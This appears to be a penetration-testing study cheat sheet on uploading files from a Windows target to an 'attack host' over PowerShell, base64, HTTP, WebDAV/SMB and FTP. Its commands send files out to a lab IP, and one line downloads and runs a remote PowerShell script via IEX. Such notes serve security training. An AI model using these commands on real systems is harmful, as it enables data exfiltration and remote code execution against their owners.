# Windows File transfers - Uploads

## PowerShell Base64 Encode & Decode

1. Encode File Using PowerShell

[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

2. Copy this content and paste it into our attack host

3. Decode Base64 String in Linux

echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

md5sum hosts

## PowerShell Web Uploads

1. Installing a Configured WebServer with Upload

pip3 install uploadserver

python3 -m uploadserver

2. PowerShell Script to Upload a File to Python Upload Server

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

## PowerShell Base64 Web Upload

1. PowerShell Script to Upload a File to Python Upload Server

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

2. Use Netcat to listen in on a port we specify and send the file as a POST request

nc -lvnp 8000

echo <base64> | base64 -d -w 0 > hosts

## SMB Uploads

**Conditions :** Companies allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols and don't allow the SMB protocol (TCP/445)

WebDAV = If there's no SMB share available using SMB protocol, it will try to connect using HTTP.

1. Configuring WebDav Server

sudo pip install wsgidav cheroot

2. Using the WebDav Python module

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

3. Connecting to the Webdav Share

dir \\192.168.49.128\DavWWWRoot

4. Uploading Files using SMB

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

## FTP Uploads

1. Installing the FTP Server Python3 Module - pyftpdlib

sudo python3 -m pyftpdlib --port 21 --write

We need to specify the option --write to allow clients to upload files to our attack host.

2. a) PowerShell Upload File

(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

2. b) Create a Command File for the FTP Client to Upload a File

echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

-> Launching of FTP upload



